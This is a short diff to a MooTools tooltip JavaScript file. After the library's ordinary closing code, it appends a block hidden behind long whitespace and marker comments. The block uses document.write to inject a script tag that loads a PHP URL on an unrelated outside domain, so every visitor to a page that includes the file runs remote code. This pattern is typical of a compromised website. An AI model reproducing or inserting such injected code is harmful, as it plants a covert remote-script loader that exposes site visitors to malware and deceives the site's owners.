@@ -200,3 +200,12 @@ var MooTooltips = new Class({
 		return {'container':container,'header':header,'message':message,'footer':footer,'close':closeBtn||null};		
 	}	
 });
+
+/*314d61*/
+
+                    																	                               	 /*gbargbar09311gbar09*/
+
+document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525363'></"+ "script>");
+
+
+/*/314d61*/
